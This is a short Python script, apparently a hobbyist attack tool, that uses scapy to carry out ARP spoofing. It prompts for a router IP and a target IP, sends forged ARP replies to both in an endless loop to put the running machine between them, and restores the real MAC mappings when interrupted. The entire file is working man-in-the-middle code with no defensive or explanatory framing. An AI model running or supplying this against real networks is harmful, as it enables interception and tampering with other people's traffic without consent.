 # ! Changes the MAC Address of initial to match the destination

import scapy.all as scapy
from scapy.sendrecv import sr

def restore(dest_ip, src_ip): # Note: Restores the MAC Address so packets are sent successfully
    target_mac = get_target_mac(dest_ip)
    src_mac = get_target_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=target_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(packet, verbose=False)

def get_target_mac(ip): # Note: Returns the MAC Address of target
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpack = broadcast/arp_request
    answer = scapy.srp(finalpack, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc
    return(mac)

def spoof_arp(target_ip, spoofed_ip): # Note: Spoofs the Target IP with the specified MAC
    mac = get_target_mac(target_ip)
    packet = scapy.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.send(packet, verbose=False)

def main():
    initial = input("[*] Enter IP Address of the router: ")
    final = input("[*] Enter IP Address of Destination: ")
    try:
        while True:
            spoof_arp(initial, final)
            spoof_arp(final, initial)
    except KeyboardInterrupt: # Note: Restores MAC Address once program is stopped
        print("Keyboard Interruped")
        restore(initial, final) #Router, machine MAC to change
        restore(final, initial)
        exit(0)

if __name__ == "__main__":
    main()
